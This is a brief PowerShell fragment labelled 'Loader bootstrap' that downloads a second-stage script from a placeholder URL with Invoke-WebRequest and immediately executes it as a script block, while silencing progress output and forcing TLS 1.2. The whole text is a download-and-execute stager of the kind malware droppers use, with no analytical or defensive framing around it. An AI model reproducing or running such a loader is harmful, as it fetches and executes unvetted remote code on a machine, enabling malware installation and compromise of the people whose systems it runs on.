
<# Loader bootstrap #> $Stage2Url = 'https://example.com/stage2.ps1'; $StageScript = (iwr $Stage2Url -UseBasicParsing).Content; [ScriptBlock]::Create($StageScript).Invoke(); $ProgressPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
